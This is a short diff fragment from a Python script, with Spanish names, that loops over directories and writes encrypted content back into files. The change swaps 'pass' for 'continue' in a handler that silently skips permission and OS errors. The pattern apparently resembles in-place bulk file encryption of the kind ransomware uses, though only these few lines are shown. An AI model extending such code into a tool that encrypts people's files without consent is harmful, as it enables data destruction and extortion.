@@ -40,4 +40,4 @@ for directorio in directorios:
                     file.write(contenido_encriptado)
 
            except (PermissionError, OSError):
-                pass  
+                continue 
